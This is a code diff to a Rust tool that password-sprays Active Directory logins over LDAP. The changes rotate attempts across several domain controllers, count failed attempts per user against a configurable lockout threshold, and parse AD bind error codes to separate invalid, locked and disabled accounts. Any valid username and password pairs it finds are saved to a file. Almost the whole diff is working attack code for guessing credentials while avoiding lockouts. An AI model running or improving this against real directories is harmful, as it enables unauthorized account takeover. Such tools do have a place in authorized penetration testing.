@@ -4,7 +4,6 @@ use crate::help::add_terminal_spacing;
 use crate::help::print_timestamp;
 use chrono::Local;
 use ldap3::LdapConn;
-use rand::Rng;
 use std::error::Error;
 use std::fs::File;
 use std::io::{self, BufRead, Write};
@@ -17,7 +16,7 @@ pub struct SprayConfig {
     pub userfile: String,
     pub passwords: String,
     pub domain: String,
-    pub dc_ip: String,
+    pub dc_ip: Vec<String>, // Change from String to Vec<String>
     pub hash: Option<String>,
     pub timestamp_format: bool,
     pub proxy: Option<ProxyConfig>,
@@ -26,6 +25,8 @@ pub struct SprayConfig {
     pub delay: u64,
     pub continue_on_success: bool,
     pub verbose: bool,
+    pub lockout_threshold: u32, // New
+    pub lockout_window_seconds: u32,
 }
 
 impl SprayConfig {
@@ -43,51 +44,67 @@ impl SprayConfig {
             delay: args.delay,
             continue_on_success: args.continue_on_success,
             verbose: args.verbose,
+            lockout_threshold: args.lockout_threshold.unwrap_or(3), // Default: 3 attempts
+            lockout_window_seconds: args.lockout_window_seconds.unwrap_or(300), // Default: 300 seconds
         })
     }
 }
 
+pub enum LoginResult {
+    Success,
+    InvalidCredentials,
+    AccountLocked,
+    AccountDisabled,
+    Failed,
+}
+
 pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
+    let lockout_threshold = config.lockout_threshold;
+    let lockout_window_seconds = config.lockout_window_seconds;
+    let mut invalid_attempts: std::collections::HashMap<String, (u32, std::time::Instant)> =
+        std::collections::HashMap::new();
+    let mut warned_users = std::collections::HashSet::new(); // Keep track of warned users
+
     add_terminal_spacing(1);
-    println!("[*] Target: {}", config.dc_ip);
     println!("[*] Domain: {}", config.domain);
 
-    let ldap_url = if config.dc_ip.starts_with("ldap://") {
-        config.dc_ip.clone()
-    } else {
-        format!("ldap://{}", config.dc_ip)
-    };
+    // Filter reachable domain controllers
+    println!("[*] Testing connectivity for Domain Controllers...");
+    let reachable_dcs: Vec<String> = config
+        .dc_ip
+        .iter()
+        .filter_map(|dc| {
+            if let Ok(_) = check_ldap_port(dc, 389, Duration::from_secs(5)) {
+                println!("[+] Successfully connected to {}", dc);
+                Some(dc.clone())
+            } else {
+                println!("[-] Failed to connect to {}", dc);
+                None
+            }
+        })
+        .collect();
 
-    // Extract host from ldap_url for TCP check
-    let host = if ldap_url.starts_with("ldap://") {
-        ldap_url.trim_start_matches("ldap://").to_string()
-    } else {
-        ldap_url.clone()
-    };
-
-    let port = 389;
-    let timeout = Duration::from_secs(10); // 10 second timeout
-
-    // Test LDAP connectivity first
-    println!("[*] Testing LDAP connectivity to {}", ldap_url);
-    match check_ldap_port(&host, port, timeout) {
-        Ok(_) => println!("[+] Successfully connected to LDAP server"),
-        Err(e) => return Err(format!("[-] Failed to connect to LDAP server: {}", e).into()),
+    if reachable_dcs.is_empty() {
+        return Err("No reachable Domain Controllers.".into());
     }
+
+    println!("[*] Reachable Domain Controllers: {:?}", reachable_dcs);
 
     let users = read_users(&config.userfile)?;
     let passwords = read_lines(&config.passwords)?;
 
     println!("[*] Loaded {} users", users.len());
     println!("[*] Loaded {} passwords", passwords.len());
+    println!("[*] Lockout Threshold: {} attempts", lockout_threshold);
+    println!("[*] Lockout Window: {} seconds\n", lockout_window_seconds);
     println!("[*] Starting password spray at {}\n", print_timestamp());
 
     let timestamp = Local::now().format("%Y%m%d_%H%M%S");
     let output_file = format!("found_credentials_{}.txt", timestamp);
-    let mut found_creds = None;
+    let mut found_creds: Option<File> = None;
     let mut valid_credentials_found = false;
-    let total_attempts = users.len() * passwords.len();
-    let mut attempt_count = 0;
+
+    let mut dc_index = 0; // Index to rotate domain controllers
 
     for (password_index, password) in passwords.iter().enumerate() {
         println!(
@@ -97,31 +114,30 @@ pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
             passwords.len()
         );
 
-        for (_user_index, user) in users.iter().enumerate() {
-            attempt_count += 1;
-            let progress_percentage = (attempt_count as f64 / total_attempts as f64 * 100.0) as u32;
+        for user in &users {
+            let current_dc = &reachable_dcs[dc_index];
+            dc_index = (dc_index + 1) % reachable_dcs.len(); // Rotate DCs
 
-            // Show attempt details with percentage
             println!(
-                "[*] [{:3}%] Attempting login: {}@{} ({}/{} attempts)",
-                progress_percentage, user, config.domain, attempt_count, total_attempts
+                "[*] Attempting login: {}@{} on {}",
+                user, config.domain, current_dc
             );
 
-            // Add random delay between 0-X seconds if jitter is enabled
-            if config.jitter > 0 {
-                let delay = rand::thread_rng().gen_range(0..config.jitter);
-                thread::sleep(Duration::from_millis(delay as u64));
-            }
-
-            match try_login(&ldap_url, user, &password, &config.domain) {
-                Ok(true) => {
+            match try_login(
+                &format!("ldap://{}", current_dc),
+                user,
+                password,
+                &config.domain,
+            ) {
+                Ok(LoginResult::Success) => {
+                    // Handle successful login
                     if found_creds.is_none() {
                         found_creds = Some(File::create(&output_file)?);
                     }
 
                     let success_msg = format!(
                         "[+] Valid credentials found!\n    Username: {}\n    Password: {}\n    Domain: {}\n    Server: {}\n",
-                        user, password, config.domain, ldap_url
+                        user, password, config.domain, current_dc
                     );
                     println!("\x1b[32m{}\x1b[0m", success_msg.trim());
 
@@ -136,49 +152,77 @@ pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
                         return Ok(());
                     }
                 }
-                Ok(false) => {
-                    if config.verbose {
+                Ok(LoginResult::InvalidCredentials) => {
+                    println!(
+                        "[-] Failed login: {}@{} with password: {}",
+                        user, config.domain, password
+                    );
+
+                    let entry = invalid_attempts
+                        .entry(user.clone())
+                        .or_insert((0, std::time::Instant::now()));
+                    entry.0 += 1;
+
+                    if entry.0 > lockout_threshold
+                        && entry.1.elapsed().as_secs() <= lockout_window_seconds as u64
+                        && !warned_users.contains(user)
+                    {
                         println!(
-                            "[-] Failed login: {}@{} with password: {}",
-                            user, config.domain, password
+                            "\x1b[33m[!] Warning: {} has reached the lockout threshold ({} attempts in {} seconds)\x1b[0m",
+                            user, lockout_threshold, lockout_window_seconds
                         );
+                        println!("[!] Do you want to continue spraying? (yes/no): ");
+
+                        let mut response = String::new();
+                        std::io::stdin().read_line(&mut response)?;
+                        if matches!(response.trim().to_lowercase().as_str(), "no" | "n") {
+                            println!("[*] Aborting spray as per user request.");
+                            return Ok(());
+                        } else {
+                            println!("[*] Continuing spray...");
+                            warned_users.insert(user.clone());
+                        }
+                    }
+
+                    if entry.1.elapsed().as_secs() > lockout_window_seconds as u64 {
+                        entry.0 = 1;
+                        entry.1 = std::time::Instant::now();
                     }
                 }
+                Ok(LoginResult::AccountLocked) => {
+                    println!(
+                        "\x1b[31m[!] Account locked: {}@{}\x1b[0m",
+                        user, config.domain
+                    );
+                }
+                Ok(LoginResult::AccountDisabled) => {
+                    println!(
+                        "\x1b[31m[!] Account disabled: {}@{}\x1b[0m",
+                        user, config.domain
+                    );
+                }
+                Ok(LoginResult::Failed) => {
+                    println!(
+                        "\x1b[31m[!] Failed login due to unknown reasons: {}@{}\x1b[0m",
+                        user, config.domain
+                    );
+                }
                 Err(e) => {
-                    if !e.to_string().contains("rc=49")
-                        && !e.to_string().contains("invalidCredentials")
-                        && !e.to_string().contains("AcceptSecurityContext error")
-                    {
-                        eprintln!(
-                            "\x1b[33m[!] Connection Error: {}@{} - {}\x1b[0m",
-                            user, config.domain, e
-                        );
-                    } else if config.verbose {
-                        println!(
-                            "[-] Failed login: {}@{} with password: {}",
-                            user, config.domain, password
-                        );
-                    }
+                    eprintln!(
+                        "\x1b[31m[!] Connection Error: {}@{} on {} - {}\x1b[0m",
+                        user, config.domain, current_dc, e
+                    );
                 }
             }
 
-            // Add configured delay between attempts if specified
+            // Delay between attempts
             if config.delay > 0 {
                 thread::sleep(Duration::from_secs(config.delay));
             }
         }
-
-        println!(
-            "\n[*] Completed password: '{}' - Progress: {}/{} ({}%)",
-            password,
-            password_index + 1,
-            passwords.len(),
-            ((password_index + 1) as f64 / passwords.len() as f64 * 100.0) as u32
-        );
     }
 
-    println!("\n[*] Password spray complete");
-    println!("[*] Total attempts: {}", attempt_count);
+    println!("\n[*] Password spray complete at {}\n", print_timestamp());
     if valid_credentials_found {
         println!(
             "[+] Valid credentials were found and saved to: {}",
@@ -187,6 +231,7 @@ pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
     } else {
         println!("[-] No valid credentials were found");
     }
+
     Ok(())
 }
 
@@ -195,34 +240,35 @@ fn try_login(
     username: &str,
     password: &str,
     domain: &str,
-) -> Result<bool, Box<dyn Error>> {
+) -> Result<LoginResult, Box<dyn Error>> {
     // Create LDAP connection
-    let mut ldap = match LdapConn::new(ldap_url) {
-        Ok(conn) => conn,
-        Err(e) => return Err(Box::new(e)),
-    };
+    let mut ldap = LdapConn::new(ldap_url)?;
 
-    // Format username with domain (UPN format)
+    // Format the username with the domain (UPN format)
     let bind_dn = format!("{}@{}", username.trim(), domain);
 
-    // Attempt bind
+    // Attempt a bind
     match ldap.simple_bind(&bind_dn, password) {
         Ok(result) => {
             match result.success() {
-                Ok(_) => Ok(true),   // Successful login
-                Err(_) => Ok(false), // Failed login
+                Ok(_) => Ok(LoginResult::Success),             // Login succeeded
+                Err(_) => Ok(LoginResult::InvalidCredentials), // Bind failed with invalid credentials
             }
         }
         Err(e) => {
             let error_string = e.to_string();
-            // Check if this is an invalid credentials error (code 49)
-            if error_string.contains("rc=49")
-                || error_string.contains("invalidCredentials")
-                || error_string.contains("AcceptSecurityContext error")
-            {
-                Ok(false) // Invalid credentials - failed login
+
+            if error_string.contains("data 52e") {
+                // Invalid credentials
+                Ok(LoginResult::InvalidCredentials)
+            } else if error_string.contains("data 775") {
+                // Account locked out
+                Ok(LoginResult::AccountLocked)
+            } else if error_string.contains("data 533") {
+                // Account disabled
+                Ok(LoginResult::AccountDisabled)
             } else {
-                // Only real connection errors should be reported as errors
+                // Other errors, e.g., connection errors
                 Err(Box::new(e))
             }
         }
